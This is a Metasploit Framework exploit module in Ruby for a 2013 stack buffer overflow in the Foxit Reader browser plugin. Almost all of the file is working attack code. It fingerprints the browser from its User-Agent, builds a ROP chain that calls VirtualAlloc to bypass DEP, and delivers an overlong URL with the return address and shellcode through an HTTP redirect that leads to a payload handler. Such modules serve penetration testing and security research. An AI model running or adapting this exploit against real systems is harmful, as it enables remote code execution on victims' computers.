##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpServer::HTML

	Rank = NormalRanking

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Foxit Reader Plugin URL Processing Buffer Overflow",
			'Description'    => %q{
					This module exploits a vulnerability in the Foxit Reader Plugin, it exists in
					the npFoxitReaderPlugin.dll module. When loading PDF files from remote hosts,
					overly long query strings within URLs can cause a stack-based buffer 
overflow,
					which can be exploited to execute arbitrary code. This exploit has been 
tested
					on Windows 7 SP1 with Firefox 18.0 and Foxit Reader version 5.4.4.11281
					(npFoxitReaderPlugin.dll version 2.2.1.530).
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'rgod <rgod[at]autistici.org>',       # initial discovery and poc
					'Sven Krewitt <svnk[at]krewitt.org>', # metasploit module
					'juan vazquez',                       # metasploit module
				],
			'References'     =>
				[
					[ 'OSVDB', '89030' ],
					[ 'BID', '57174' ],
					[ 'EDB', '23944' ],
					[ 'URL', 'http://retrogod.altervista.org/9sg_foxit_overflow.htm' ],
					[ 'URL', 'http://secunia.com/advisories/51733/' ]
				],
			'Payload'        =>
				{
					'Space'       => 2000,
					'DisableNops' => true
				},
			'DefaultOptions'  =>
				{
					'EXITFUNC' => "process",
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# npFoxitReaderPlugin.dll version 2.2.1.530
					[ 'Automatic', {} ],
					[ 'Windows 7 SP1 / Firefox 18 / Foxit Reader 5.4.4.11281',
						{
							'Offset'          => 272,
							'Ret'             => 0x1000c57d, # pop # ret # from 
npFoxitReaderPlugin
							'WritableAddress' => 0x10045c10, # from npFoxitReaderPlugin
							:rop => :win7_rop_chain
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Jan 7 2013",
			'DefaultTarget'  => 0))
	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		#Mozilla/5.0 (Windows NT 6.1; rv:18.0) Gecko/20100101 Firefox/18.0
		nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
		firefox = agent.scan(/Firefox\/(\d+\.\d+)/).flatten[0] || ''

		case nt
			when '5.1'
				os_name = 'Windows XP SP3'
			when '6.0'
				os_name = 'Windows Vista'
			when '6.1'
				os_name = 'Windows 7'
		end

		if os_name == 'Windows 7' and firefox =~ /18/
			return targets[1]
		end

		return nil
	end

	def junk
		return rand_text_alpha(4).unpack("L")[0].to_i
	end

	def nops
		make_nops(4).unpack("N*")
	end

	# Uses rop chain from npFoxitReaderPlugin.dll (foxit) (no ASLR module)
	def win7_rop_chain

		# rop chain generated with mona.py - www.corelan.be
		rop_gadgets =
			[
				0x1000ce1a, # POP EAX # RETN [npFoxitReaderPlugin.dll]
				0x100361a8, # ptr to &VirtualAlloc() [IAT npFoxitReaderPlugin.dll]
				0x1000f055, # MOV EAX,DWORD PTR DS:[EAX] # RETN [npFoxitReaderPlugin.dll]
				0x10021081, # PUSH EAX # POP ESI # RETN 0x04 [npFoxitReaderPlugin.dll]
				0x10007971, # POP EBP # RETN [npFoxitReaderPlugin.dll]
				0x41414141, # Filler (RETN offset compensation)
				0x1000614c, # & push esp # ret  [npFoxitReaderPlugin.dll]
				0x100073fa, # POP EBX # RETN [npFoxitReaderPlugin.dll]
				0x00001000, # 0x00001000-> edx
				0x1000d9ec, # XOR EDX, EDX # RETN
				0x1000d9be, # ADD EDX,EBX # POP EBX # RETN 0x10 [npFoxitReaderPlugin.dll]
				junk,
				0x100074a7, # POP ECX # RETN [npFoxitReaderPlugin.dll]
				junk,
				junk,
				junk,
				0x41414141, # Filler (RETN offset compensation)
				0x00000040, # 0x00000040-> ecx
				0x1000e4ab, # POP EBX # RETN [npFoxitReaderPlugin.dll]
				0x00000001, # 0x00000001-> ebx
				0x1000dc86, # POP EDI # RETN [npFoxitReaderPlugin.dll]
				0x1000eb81, # RETN (ROP NOP) [npFoxitReaderPlugin.dll]
				0x1000c57d, # POP EAX # RETN [npFoxitReaderPlugin.dll]
				nops,
				0x10005638, # PUSHAD # RETN [npFoxitReaderPlugin.dll]
			].flatten.pack("V*")

		return rop_gadgets
	end

	def on_request_uri(cli, request)

		agent = request.headers['User-Agent']
		my_target = get_target(agent)

		# Avoid the attack if no suitable target found
		if my_target.nil?
			print_error("Browser not supported, sending 404: #{agent}")
			send_not_found(cli)
			return
		end

		unless self.respond_to?(my_target[:rop])
			print_error("Invalid target specified: no callback function defined")
			send_not_found(cli)
			return
		end

		return if ((p = regenerate_payload(cli)) == nil)

		# we use two responses:
		# one for an HTTP 301 redirect and sending the payload
		# and one for sending the HTTP 200 OK with appropriate Content-Type
		if request.resource =~ /\.pdf$/
			# sending Content-Type
			resp = create_response(200, "OK")
			resp.body = ""
			resp['Content-Type'] = 'application/pdf'
			resp['Content-Length'] = rand_text_numeric(3,"0")
			cli.send_response(resp)
			return
		else
			resp = create_response(301, "Moved Permanently")
			resp.body = ""

			my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : 
datastore['SRVHOST']
			if datastore['SSL']
				schema = "https"
			else
				schema = "http"
			end

			sploit = rand_text_alpha(my_target['Offset'] - 
"#{schema}://#{my_host}:#{datastore['SRVPORT']}#{request.uri}.pdf?".length)
			sploit << [my_target.ret].pack("V") # EIP
			sploit << [my_target['WritableAddress']].pack("V") # Writable Address
			sploit << self.send(my_target[:rop])
			sploit << p.encoded

			resp['Location'] = request.uri + '.pdf?' + Rex::Text.uri_encode(sploit, 'hex-all')
			cli.send_response(resp)

			# handle the payload
			handler(cli)
		end
	end

end
